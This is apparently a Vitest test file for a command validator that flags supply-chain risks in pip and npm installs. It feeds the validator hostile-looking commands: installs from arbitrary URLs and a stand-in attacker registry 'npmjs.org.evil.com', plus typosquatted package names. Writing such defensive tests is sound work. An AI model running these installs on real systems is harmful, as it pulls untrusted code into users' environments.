import { describe, it, expect } from 'vitest';
import { validate } from '../../src/engine';

describe('ecosystem', () => {
  describe('malicious / supply chain', () => {
    it('blocks pip install of an https URL', () => {
      const v = validate('pip install https://example.com/malicious-pkg-1.0.0.tar.gz');
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.category === 'ecosystem')).toBe(true);
    });

    it('blocks npm install of an https URL', () => {
      const v = validate('npm install https://example.com/some-tarball.tgz');
      expect(v.severity).toBe('block');
      expect(v.findings.some((f) => f.category === 'ecosystem')).toBe(true);
    });

    it('blocks pip install git+https://...', () => {
      const v = validate('pip install git+https://github.com/sketchy/package.git');
      expect(v.findings.some((f) => f.category === 'ecosystem')).toBe(true);
    });

    it('warns on --index-url pointing at a non-default registry', () => {
      const v = validate('pip install --index-url https://my-private-registry.example.com/simple/ requests');
      expect(v.findings.some((f) => f.category === 'ecosystem')).toBe(true);
    });

    it('warns on npm --registry pointing at a non-default registry', () => {
      const v = validate('npm install --registry=https://my-mirror.example.com/ react');
      expect(v.findings.some((f) => f.category === 'ecosystem')).toBe(true);
    });

    it('warns on a known typosquatted package name', () => {
      const v = validate('npm install lodassh');
      expect(v.findings.some((f) => f.ruleId === 'ecosystem.typosquat')).toBe(true);
    });

    it('warns on python3-dateutil typosquat', () => {
      const v = validate('pip install python3-dateutil');
      expect(v.findings.some((f) => f.ruleId === 'ecosystem.typosquat')).toBe(true);
    });

    it('catches an attacker host that just substring-matches the allowlist', () => {
      const v = validate(
        'npm install --registry=https://npmjs.org.evil.com/ react',
      );
      expect(
        v.findings.some((f) => f.ruleId === 'ecosystem.custom_registry'),
      ).toBe(true);
    });
  });

  describe('benign', () => {
    it('does not flag npm install lodash', () => {
      const v = validate('npm install lodash');
      expect(v.severity).toBe('allow');
    });

    it('does not flag pip install requests', () => {
      const v = validate('pip install requests');
      expect(v.severity).toBe('allow');
    });

    it('does not flag npm i with no args', () => {
      const v = validate('npm i');
      expect(v.severity).toBe('allow');
    });

    it('does not flag explicit default registry', () => {
      const v = validate(
        'npm install --registry=https://registry.npmjs.org/ react',
      );
      expect(v.severity).toBe('allow');
    });

    it('does not flag pypi default index', () => {
      const v = validate('pip install --index-url https://pypi.org/simple/ requests');
      expect(v.severity).toBe('allow');
    });

    it('does not flag a comment that only mentions --registry', () => {
      const v = validate(
        '# remember to use --registry=https://my-mirror.example.com/ when installing',
      );
      expect(v.severity).toBe('allow');
    });
  });
});
